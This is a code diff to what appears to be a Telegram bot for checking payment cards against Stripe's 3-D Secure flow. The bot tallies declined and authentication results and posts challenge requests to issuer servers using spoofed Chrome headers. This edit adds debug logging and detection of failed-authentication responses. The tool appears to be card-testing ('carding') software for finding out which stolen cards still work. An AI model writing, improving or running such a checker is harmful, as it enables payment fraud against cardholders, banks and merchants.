@@ -21,7 +21,7 @@ stats = {
     'not_auth': 0,
     'unavailable': 0,
     'declined': 0,
-    'failed_auth': 0,  # جديد
+    'failed_auth': 0,
     'errors': 0,
     'start_time': None,
     'is_running': False,
@@ -145,36 +145,64 @@ class StripeChecker:
                     return 'DECLINED', 'Rejected by issuer'
                 
                 # إذا كانت الحالة C، نفحص الـ Challenge
-                if status == 'C' and 'creq' in auth and 'acsURL' in auth['ares']:
+                if status == 'C' and 'creq' in auth and 'ares' in auth and 'acsURL' in auth['ares']:
                     try:
                         creq = auth['creq']
                         acs_url = auth['ares']['acsURL']
                         
-                        # إعداد headers للطلب
+                        print(f"[DEBUG] Challenge detected for card")
+                        print(f"[DEBUG] ACS URL: {acs_url}")
+                        print(f"[DEBUG] CREQ: {creq[:50]}...")
+                        
+                        # إعداد headers مع cookies للطلب
                         challenge_headers = {
-                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+                            'cache-control': 'max-age=0',
                             'content-type': 'application/x-www-form-urlencoded',
+                            'dnt': '1',
                             'origin': 'https://js.stripe.com',
+                            'priority': 'u=0, i',
                             'referer': 'https://js.stripe.com/',
-                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+                            'sec-ch-ua-mobile': '?0',
+                            'sec-ch-ua-platform': '"Windows"',
+                            'sec-fetch-dest': 'iframe',
+                            'sec-fetch-mode': 'navigate',
+                            'sec-fetch-site': 'cross-site',
+                            'upgrade-insecure-requests': '1',
+                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
                         }
                         
                         challenge_data = {'creq': creq}
                         
                         # إرسال الطلب
+                        print(f"[DEBUG] Sending challenge request...")
                         challenge_response = self.session.post(
                             acs_url,
                             headers=challenge_headers,
                             data=challenge_data,
-                            timeout=15
+                            timeout=15,
+                            allow_redirects=True
                         )
                         
                         # فحص الرد
                         html_response = challenge_response.text
-                        if 'Authentication failed' in html_response:
+                        print(f"[DEBUG] Response status: {challenge_response.status_code}")
+                        print(f"[DEBUG] Response length: {len(html_response)}")
+                        
+                        # فحص أكثر من كلمة للتأكد
+                        if 'Authentication failed' in html_response or 'authentication failed' in html_response.lower():
+                            print(f"[DEBUG] ✅ Found 'Authentication failed' in response!")
                             return 'FAILED_AUTH', 'Authentication failed in challenge'
+                        else:
+                            print(f"[DEBUG] ❌ 'Authentication failed' NOT found in response")
+                            # نطبع جزء من الـ response للتشخيص
+                            if len(html_response) > 200:
+                                print(f"[DEBUG] Response preview: {html_response[:200]}...")
                         
                     except Exception as e:
+                        print(f"[DEBUG] Error in challenge check: {str(e)}")
                         # لو حصل خطأ في الفحص، نكمل عادي ونعتبرها C
                         pass
                 
@@ -607,7 +635,7 @@ def main():
     print("[🤖] Starting Stripe 3DS Telegram Bot...")
     print("[✅] Bot will send results in chat (no channel)")
     print("[✅] Using asyncio.create_task (no threading)")
-    print("[✅] Failed Authentication detection enabled")
+    print("[✅] Failed Authentication detection enabled with DEBUG logs")
     
     app = Application.builder().token(BOT_TOKEN).build()
     
